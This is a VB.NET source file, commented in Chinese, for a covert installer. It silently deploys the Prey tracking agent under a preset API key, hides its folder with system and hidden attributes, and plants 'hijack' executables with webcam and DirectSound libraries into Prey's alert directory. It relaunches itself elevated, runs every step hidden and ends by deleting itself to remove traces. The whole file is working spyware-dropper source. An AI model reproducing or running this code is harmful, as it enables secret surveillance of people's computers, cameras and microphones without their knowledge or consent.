Imports System.Security.Principal

Public Class DisplayForm
    '调用 [映像文件]
    Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Integer, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Integer) As Integer
    Dim MySelfPath As String = IO.Path.GetTempPath() & "winscr" & My.Computer.Clock.TickCount & ".exe"
    Dim PreyMSIPath As String = IO.Path.GetTempPath() & "Prey.msi"
    Dim PreyDirectroy As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) & "\Prey"
    Dim PreyVireion As String = "1.6.3"
    Dim FlashDirectroy As String = PreyDirectroy & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\"
    Dim APIKEY As String = "A4E064ED041C"

    Private Sub DisplayForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Visible = False

        '如果启动不包含参数，则把程序复制到临时目录，并加入参数运行
        If Command() = vbNullString Then
            If IO.File.Exists(MySelfPath) Then IO.File.Delete(MySelfPath)
            FileSystem.FileCopy(Application.ExecutablePath, MySelfPath)
            '不等待宿主程序退出而退出
            ShellExecute(0, "runas", MySelfPath, "winscr", vbNullString, vbHide)
            End
        End If

        '检查管理员权限
        If Not (New WindowsPrincipal(WindowsIdentity.GetCurrent).IsInRole(New SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, Nothing))) Then
            MsgBox("程序需要管理员权限!请右击程序文件，然后选择""以管理员权限运行""！")
            End
        End If

        '释放 MSI 安装文件
        If Not SaveResourceFile(My.Resources.BinaryResource.prey, PreyMSIPath) Then End

        '静默安装 Prey 服务
        If Not InstallMSI() Then End

        '安装完毕后删除 MSI 安装程序
        If IO.File.Exists(PreyMSIPath) Then IO.File.Delete(PreyMSIPath)

        '使用管理员权限对整个目标目录提权，方便日后寄生程序的静默更新
        '参数"/d y"表示对子目录进行循环遍历提权，大概需要 半分钟 时间，如不需要对子目录循环遍历提权，把 "/d y" 改为 "/d n"
        Shell("cmd.exe /c takeown /f " & PreyDirectroy & "/ /r /d y && icacls " & PreyDirectroy & "/ /grant administrators:F /t", vbHide, True)
        '对 Prey 目录添加 [系统] 和 [隐藏] 属性，防止用户无意发现文件
        Shell("cmd.exe /c attrib " & PreyDirectroy & " +s +h", vbHide, True)

        '释放劫持程序
        SaveResourceFile(My.Resources.BinaryResource.alert, FlashDirectroy & "alert.exe")
        SaveResourceFile(My.Resources.BinaryResource.AForge_Video, FlashDirectroy & "AForge.Video.dll")
        SaveResourceFile(My.Resources.BinaryResource.AForge_Video_DirectShow, FlashDirectroy & "AForge.Video.DirectShow.dll")
        SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX, FlashDirectroy & "Microsoft.DirectX.dll")
        SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX_DirectSound, FlashDirectroy & "Microsoft.DirectX.DirectSound.dll")
        SaveResourceFile(System.Text.Encoding.UTF8.GetBytes(My.Resources.BinaryResource.flash_exe), FlashDirectroy & "flash.exe.config")
        SaveResourceFile(My.Resources.BinaryResource.Flash, FlashDirectroy & "flash.exe")

        '使用 [update] 参数调用 寄生程序 ，接收安装/更新成功提示邮件
        ShellExecute(0, vbNullString, FlashDirectroy & "flash.exe", "update", vbNullString, vbHide)

        '结束程序并自动删除自身文件，以隐藏痕迹
        DeleteMySelf()
    End Sub

    '' <summary>
    '' 保存资源文件里的文件到硬盘
    '' </summary>
    '' <param name="ResourceByte">资源文件的指定资源</param>
    '' <param name="FilePath">储存路径</param>
    '' <return>检测文件是否释放成功</return>
    Private Function SaveResourceFile(ResourceByte() As Byte, FilePath As String) As Boolean
        '删除已经存在的文件，防止文件冲突
        If IO.File.Exists(FilePath) Then IO.File.Delete(FilePath)

        Dim ResourceStream As IO.FileStream = New IO.FileStream(FilePath, IO.FileMode.Create, IO.FileAccess.Write)

        Try
            ResourceStream.Write(ResourceByte, 0, ResourceByte.Length)
        Catch ex As Exception
            ResourceStream.Dispose()
            Return False
        End Try

        ResourceStream.Dispose()
        Return IO.File.Exists(FilePath)
    End Function

    ''' <summary>
    ''' 静默安装 Prey.msi
    ''' </summary>
    ''' <returns></returns>
    Private Function InstallMSI() As Boolean
        '静默安装：
        'msiexec.exe /i prey-windows-1.X.X-xxx.msi /lv installer.log /q AGREETOLICENSE=yes API_KEY=foobar123
        '安装完成后提示： "/q" 改为 "/qn+"
        'msiexec.exe /i prey-windows-1.X.X-xxx.msi /lv installer.log /qn+ AGREETOLICENSE=yes API_KEY=foobar123
        '跳过账户验证：计算机未连接网络会导致账户验证失败，添加 "SKIP_VALIDATION=yes"
        'msiexec.exe /i prey-windows-1.X.X-xxx.msi /lv installer.log /q AGREETOLICENSE=yes API_KEY=foobar123 SKIP_VALIDATION=yes

        '生成安装命令
        Dim ShellCommand As String = "msiexec.exe /i " & PreyMSIPath & " /q AGREETOLICENSE=yes API_KEY=" & APIKEY
        '尝试检测与 Prey 服务器的连通性
        Try
            '当无法连接到 Prey 验证服务器时，需要跳过账户验证
            If Not My.Computer.Network.Ping("www.preyproject.com") Then ShellCommand &= " SKIP_VALIDATION=yes"
        Catch ex As Exception
            '当 Ping 命令失败时，同样暂时跳过账户验证
            ShellCommand &= " SKIP_VALIDATION=yes"
        End Try
        '宿主程序具有管理员权限，所以不需要使用 ShellExecute ，方便等待进程结束
        Shell(ShellCommand, AppWinStyle.Hide, True)
        '使用 [被寄生程序] 是否存在作为返回值
        Return IO.File.Exists(FlashDirectroy & "Flash.exe")
    End Function

    ''' <summary>
    ''' 结束程序并自动删除自身，以隐藏痕迹
    ''' </summary>
    Private Sub DeleteMySelf()
        Dim CommandString As String
        CommandString = """" & Application.ExecutablePath & """"
        Shell("cmd /c for /l %a in (0,0,0) do if exist " & CommandString & " (del/a/f " & CommandString & ") else exit", vbHide)
        Application.Exit()
    End Sub

End Class
